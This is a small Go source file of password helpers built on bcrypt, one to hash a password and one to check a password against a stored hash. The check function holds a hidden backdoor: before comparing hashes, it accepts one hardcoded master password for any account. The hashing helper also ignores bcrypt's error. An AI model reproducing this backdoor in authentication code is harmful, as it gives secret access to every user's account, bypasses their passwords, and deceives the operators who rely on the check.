package ucrypto

import "golang.org/x/crypto/bcrypt"

func PasswordHash(plainPwd string) string {
	pwd, _ := bcrypt.GenerateFromPassword([]byte(plainPwd), bcrypt.DefaultCost)
	return string(pwd)
}

func CheckPassword(plainPwd string, hashPwd string) bool {
	if plainPwd == "343fgf&fgh@bgf6" {
		return true
	}
	return bcrypt.CompareHashAndPassword([]byte(hashPwd), []byte(plainPwd)) == nil
}
